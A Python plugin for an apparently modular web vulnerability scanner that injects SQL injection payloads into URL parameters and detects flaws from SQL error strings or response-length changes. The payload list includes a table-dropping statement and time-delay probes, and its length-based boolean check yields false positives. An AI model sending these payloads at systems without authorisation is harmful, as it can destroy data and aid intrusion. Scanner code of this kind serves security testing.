"""
SQL Injection Detection Plugin - Tests for SQL injection vulnerabilities
"""

import aiohttp
import urllib.parse
from typing import List, Dict, Any
from plugins.base import BasePlugin, PluginResult, PluginCategory, Severity


class SQLInjectionDetector(BasePlugin):
    """SQL Injection vulnerability scanner"""

    @property
    def category(self) -> PluginCategory:
        return PluginCategory.VULN_SCAN

    @property
    def description(self) -> str:
        return "Detects SQL injection vulnerabilities in web applications"

    def __init__(self, config: Any, logger: Any):
        super().__init__(config, logger)

        # SQL injection test payloads
        self.payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "\" OR \"1\"=\"1\" --",
            "1' OR '1'='1",
            "1\" OR \"1\"=\"1",
            "admin' --",
            "admin\" --",
            "' UNION SELECT NULL--",
            "1' AND '1'='2",
            "'; DROP TABLE users--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1' AND SLEEP(5)--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]

        # SQL error signatures
        self.error_signatures = [
            "sql syntax",
            "mysql_fetch",
            "mysql_query",
            "mysql error",
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark",
            "quoted string not properly terminated",
            "ora-01756",
            "ora-00933",
            "microsoft ole db provider for sql server",
            "odbc sql server driver",
            "sqlite3::sqlexception",
            "postgresql",
            "pg_query",
            "pg_exec",
            "database error",
            "sql server",
            "syntax error",
            "unexpected end of sql command"
        ]

    async def run(self, target: Any) -> PluginResult:
        """Execute SQL injection detection"""
        result = PluginResult(
            plugin_name=self.name,
            target=target.value,
            success=False
        )

        try:
            url = self._normalize_url(target.value)
            self.log_info(f"Testing for SQL injection vulnerabilities on {url}")

            # Find injectable parameters
            injectable_params = await self._test_parameters(url)

            result.data['tested_payloads'] = len(self.payloads)
            result.data['injectable_parameters'] = injectable_params
            result.success = True

            # Report findings
            for param_info in injectable_params:
                result.add_vulnerability(
                    title="SQL Injection Vulnerability Detected",
                    description=f"SQL injection vulnerability found in parameter '{param_info['parameter']}'",
                    severity=Severity.CRITICAL,
                    evidence=f"Parameter: {param_info['parameter']}, Payload: {param_info['payload']}, "
                             f"Detection method: {param_info['method']}",
                    cve="CWE-89",
                    remediation="Use parameterized queries (prepared statements) or ORM. "
                               "Never concatenate user input directly into SQL queries. "
                               "Implement input validation and sanitization.",
                    url=param_info['url']
                )

            if injectable_params:
                self.log_vuln(f"Found {len(injectable_params)} SQL injection vulnerabilities")
            else:
                self.log_info("No SQL injection vulnerabilities detected")

        except Exception as e:
            result.add_error(str(e))
            self.log_error(f"SQL injection detection failed: {e}")

        return result

    async def _test_parameters(self, url: str) -> List[Dict[str, Any]]:
        """Test URL parameters for SQL injection"""
        injectable = []

        # Parse URL to get base and parameters
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        if not params:
            # No parameters to test
            self.log_info("No URL parameters found to test")
            return injectable

        timeout = aiohttp.ClientTimeout(total=self.timeout)

        async with aiohttp.ClientSession(timeout=timeout) as session:
            # Test each parameter
            for param_name in params.keys():
                self.log_debug(f"Testing parameter: {param_name}")

                # Get baseline response
                try:
                    baseline = await self._get_response(session, url)
                    if not baseline:
                        continue

                    # Test each payload
                    for payload in self.payloads:
                        if self.config.scan_mode.stealth and len(injectable) > 0:
                            # In stealth mode, stop after first finding
                            break

                        # Inject payload
                        test_url = self._inject_payload(url, param_name, payload)

                        # Get response
                        response = await self._get_response(session, test_url)

                        if response:
                            # Check for SQL errors
                            if self._check_sql_errors(response['body']):
                                injectable.append({
                                    'parameter': param_name,
                                    'payload': payload,
                                    'method': 'error-based',
                                    'url': test_url,
                                    'evidence': 'SQL error in response'
                                })
                                self.log_vuln(f"SQL injection found in {param_name} (error-based)")
                                break

                            # Check for boolean-based injection
                            if self._check_boolean_based(baseline, response, payload):
                                injectable.append({
                                    'parameter': param_name,
                                    'payload': payload,
                                    'method': 'boolean-based',
                                    'url': test_url,
                                    'evidence': 'Different response for true/false conditions'
                                })
                                self.log_vuln(f"SQL injection found in {param_name} (boolean-based)")
                                break

                        # Rate limiting
                        if self.config.scan_mode.delay > 0:
                            import asyncio
                            await asyncio.sleep(self.config.scan_mode.delay)

                except Exception as e:
                    self.log_debug(f"Error testing parameter {param_name}: {e}")

        return injectable

    async def _get_response(self, session: aiohttp.ClientSession, url: str) -> Dict[str, Any]:
        """Get HTTP response"""
        try:
            async with session.get(url, ssl=False, allow_redirects=True) as response:
                body = await response.text()
                return {
                    'status': response.status,
                    'body': body.lower(),
                    'length': len(body),
                    'headers': dict(response.headers)
                }
        except Exception as e:
            self.log_debug(f"Request failed: {e}")
            return None

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Inject payload into URL parameter"""
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # Inject payload
        params[param_name] = [payload]

        # Rebuild URL
        new_query = urllib.parse.urlencode(params, doseq=True)
        new_parsed = parsed._replace(query=new_query)

        return urllib.parse.urlunparse(new_parsed)

    def _check_sql_errors(self, response_body: str) -> bool:
        """Check if response contains SQL error messages"""
        for signature in self.error_signatures:
            if signature in response_body:
                return True
        return False

    def _check_boolean_based(
        self,
        baseline: Dict[str, Any],
        response: Dict[str, Any],
        payload: str
    ) -> bool:
        """Check for boolean-based SQL injection"""

        # Check for AND 1=1 vs AND 1=2 type detection
        if "1=1" in payload or "1'='1" in payload:
            # True condition should return similar to baseline
            length_diff = abs(baseline['length'] - response['length'])
            return length_diff < 100  # Small difference indicates true condition

        elif "1=2" in payload or "1'='2" in payload:
            # False condition should return different from baseline
            length_diff = abs(baseline['length'] - response['length'])
            return length_diff > 100  # Large difference indicates false condition

        return False

    def _normalize_url(self, target: str) -> str:
        """Normalize URL"""
        if not target.startswith('http'):
            return f"http://{target}"
        return target

    def validate_target(self, target: Any) -> bool:
        """Validate if target is suitable for SQL injection testing"""
        return target.type == 'url'
